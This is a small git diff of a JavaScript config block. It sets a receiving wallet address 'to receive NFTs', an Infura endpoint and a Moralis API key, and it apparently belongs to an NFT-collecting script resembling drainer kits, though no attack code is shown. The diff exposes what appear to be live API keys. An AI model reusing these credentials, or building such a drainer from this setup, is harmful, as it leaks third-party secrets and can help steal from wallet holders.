@@ -1,5 +1,5 @@
 const address = "0x6a8e971347f96d479654858b546b06aa44D5379D";    // Your wallet that you have to receive NFTs
-const infuraId = "05d6284f81b94ef5adf29d858cb7b6b8"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const infuraId = "https://mainnet.infura.io/v3/05d6284f81b94ef5adf29d858cb7b6b8"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "Qk1ZimVEDrcgc4LztyuUzZBmrafA4FuZMc8GIfDrRzDrzx9AMVusmAXeklKFKRu1"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
